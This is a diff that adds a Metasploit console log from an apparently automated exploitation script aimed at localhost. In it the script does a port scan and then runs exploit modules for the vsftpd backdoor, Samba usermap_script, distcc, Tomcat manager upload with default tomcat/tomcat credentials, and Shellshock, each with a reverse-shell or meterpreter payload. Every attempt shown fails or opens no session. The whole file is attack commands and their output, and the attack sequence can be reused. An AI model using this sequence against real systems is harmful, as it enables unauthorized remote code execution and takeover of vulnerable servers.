@@ -1,0 +1,77 @@
+[1m[34m[*][0m Processing modules/drivers/exploitation/msf_scripts/127.0.0.1.rc for ERB directives.
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> use auxiliary/scanner/portscan/tcp
+[0mresource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set RHOSTS 127.0.0.1
+[0mRHOSTS => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set PORTS 21,22,23,25,80,139,445,3306,5432,3632,8180,8080
+[0mPORTS => 21,22,23,25,80,139,445,3306,5432,3632,8180,8080
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> run
+[0m[1m[32m[+][0m 127.0.0.1:            - 127.0.0.1:80 - TCP OPEN
+[1m[32m[+][0m 127.0.0.1:            - 127.0.0.1:3306 - TCP OPEN
+[1m[32m[+][0m 127.0.0.1:            - 127.0.0.1:8080 - TCP OPEN
+[1m[34m[*][0m 127.0.0.1:            - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set RHOSTS 127.0.0.1
+[0mRHOSTS => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set LHOST 127.0.0.1
+[0m[1m[33m[!][0m Unknown datastore option: LHOST. Did you mean RHOST?
+LHOST => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> run
+[0m[1m[31m[-][0m 127.0.0.1:21 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (127.0.0.1:21).
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> use exploit/multi/samba/usermap_script
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_netcat
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set RHOSTS 127.0.0.1
+[0mRHOSTS => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set LHOST 127.0.0.1
+[0mLHOST => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> run
+[0m[1m[33m[!][0m You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[1m[34m[*][0m Started reverse TCP handler on 127.0.0.1:4444 
+[1m[31m[-][0m 127.0.0.1:139 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (127.0.0.1:139).
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> use exploit/unix/misc/distcc_exec
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_bash
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set RHOSTS 127.0.0.1
+[0mRHOSTS => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set LHOST 127.0.0.1
+[0mLHOST => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> run
+[0m[1m[33m[!][0m You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[1m[34m[*][0m Started reverse TCP handler on 127.0.0.1:4444 
+[1m[31m[-][0m 127.0.0.1:3632 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (127.0.0.1:3632).
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> use exploit/multi/http/tomcat_mgr_upload
+[0m[1m[34m[*][0m No payload configured, defaulting to java/meterpreter/reverse_tcp
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set RHOSTS 127.0.0.1
+[0mRHOSTS => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set LHOST 127.0.0.1
+[0mLHOST => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set HTTPUSERNAME tomcat
+[0mHTTPUSERNAME => tomcat
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set HTTPPASSWORD tomcat
+[0mHTTPPASSWORD => tomcat
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> run
+[0m[1m[33m[!][0m You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[1m[34m[*][0m Started reverse TCP handler on 127.0.0.1:4444 
+[1m[34m[*][0m Retrieving session ID and CSRF token...
+[1m[31m[-][0m Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> use exploit/multi/http/apache_mod_cgi_bash_env_exec
+[0m[1m[34m[*][0m No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set RHOSTS 127.0.0.1
+[0mRHOSTS => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set RPORT 8080
+[0mRPORT => 8080
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set LHOST 127.0.0.1
+[0mLHOST => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> set TARGETURI /cgi-bin/test.cgi
+[0mTARGETURI => /cgi-bin/test.cgi
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> run
+[0m[1m[33m[!][0m You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[1m[34m[*][0m Started reverse TCP handler on 127.0.0.1:4444 
+[1m[34m[*][0m Command Stager progress - 100.00% done (1092/1092 bytes)
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (modules/drivers/exploitation/msf_scripts/127.0.0.1.rc)> exit
+[0m
